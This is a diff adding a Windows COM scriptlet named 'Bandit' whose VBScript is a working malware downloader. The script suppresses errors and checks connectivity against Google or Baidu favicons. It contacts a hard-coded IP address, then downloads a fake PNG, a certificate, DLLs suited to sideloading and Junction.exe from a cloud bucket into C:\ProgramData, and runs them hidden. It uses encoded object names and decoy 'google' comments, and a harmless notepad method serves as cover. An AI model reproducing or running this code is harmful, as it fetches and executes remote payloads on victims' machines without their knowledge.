@@ -1,0 +1,98 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+	>
+		
+	<script language="VBScript">
+		<![CDATA[
+			On Error Resume Next
+			mUrl = "https://f000.backblazeb2.com/file/ggggggg/"
+			mDir = "C:\ProgramData\$oxi\"
+			
+			AAA1 = "http://www.google.com/favicon.ico"
+			AAA2 = "http://www.baidu.com/favicon.ico"
+			PPFILE = CreateObject("Scripting.FileSystemObject").fileExists("c:\\ProgramData\\pp.txt")
+			If PPFILE Then AAA1 = AAA2 End If
+
+			Set RES=CreateObject(unescape("%41%44%4f%44%42%2e%53%74%72%65%61%6d"))
+			with RES:.Open:.LoadFromFile "C:\Windows\System32\imageres.dll":.Position = 112640:end with
+
+			Const adTypeBinary = 1
+			Const adSaveCreateOverWrite = 2
+			Dim http,ado
+			Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
+			http.SetOption 2, 13056
+			
+			http.open "GET","http://123.207.104.140/runtime/cache/log/pp.php",False:http.send  'google
+			http.open "GET",AAA1,False 'google
+			http.send 'google
+			If http.status <> 200 then 'google
+			windows.Close 'google
+			Else 'google
+	
+			http.open "GET",mUrl&"QQ20190522141458.png",False
+			http.send
+			Set ado = createobject("Adodb.Stream")
+			ado.Type = adTypeBinary
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile mDir&"QQ20190522141458.png",2
+			ado.Close
+			CreateObject("WScript.Shell").Run mDir&"QQ20190522141458.png",0,false
+			
+			http.open "GET",mUrl&"activedsg.crt",False
+			http.send
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile mDir&"activeds.crt",2
+			ado.Close
+			
+			http.open "GET",mUrl&"vixDiskMountApi.dll",False
+			http.send
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile mDir&"vixDiskMountApi.dll",2
+			ado.Close
+
+			http.open "GET",mUrl&"sysimgbase.dll",False
+			http.send
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile mDir&"sysimgbase.dll",2
+			ado.Close
+
+			http.open "GET",mUrl&"Junction.exe",False
+			http.send
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile mDir&"Junction.exe",2
+			ado.Close
+			
+			CreateObject("WScript.Shell").Run mDir&"Junction.exe",0,false
+			
+			End If 'google
+		]]>
+	</script>
+	
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
+	}
+
+]]>
+</script>
+
+</scriptlet>
